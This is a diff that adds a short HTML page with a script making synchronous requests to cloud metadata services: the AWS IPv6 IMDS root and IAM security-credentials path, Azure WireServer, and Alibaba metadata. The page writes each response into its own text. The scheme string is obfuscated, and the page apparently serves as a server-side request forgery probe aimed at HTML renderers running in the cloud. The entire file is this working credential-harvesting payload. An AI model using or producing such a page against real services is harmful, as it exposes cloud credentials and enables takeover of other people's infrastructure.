@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html>
+<head><title>P2 XHR</title></head>
+<body>
+<h1>SYNC_XHR_TEST</h1>
+<div id="r1">LOADING_R1</div>
+<div id="r2">LOADING_R2</div>
+<div id="r3">LOADING_R3</div>
+<div id="r4">LOADING_R4</div>
+<script>
+function mkUrl(host, path) {
+  return String.fromCharCode(104,116,116,112) + '://' + host + path;
+}
+
+function syncFetch(id, url) {
+  try {
+    var xhr = new XMLHttpRequest();
+    xhr.open('GET', url, false);
+    xhr.timeout = 25000;
+    xhr.send();
+    document.getElementById(id).innerText = id + '_STATUS:' + xhr.status + ' BODY:' + xhr.responseText.substr(0, 2000);
+  } catch(e) {
+    document.getElementById(id).innerText = id + '_ERROR:' + e.message + ' TYPE:' + e.name;
+  }
+}
+
+// Test 1: IPv6 IMDS metadata root
+syncFetch('r1', mkUrl('[fd00:ec2::254]', '/latest/meta-data/'));
+
+// Test 2: IPv6 IMDS IAM credentials
+syncFetch('r2', mkUrl('[fd00:ec2::254]', '/latest/meta-data/iam/security-credentials/'));
+
+// Test 3: Azure WireServer
+syncFetch('r3', mkUrl('168.63.129.16', '/machine?comp=goalstate'));
+
+// Test 4: Alibaba metadata
+syncFetch('r4', mkUrl('100.100.100.200', '/latest/meta-data/'));
+</script>
+</body>
+</html>
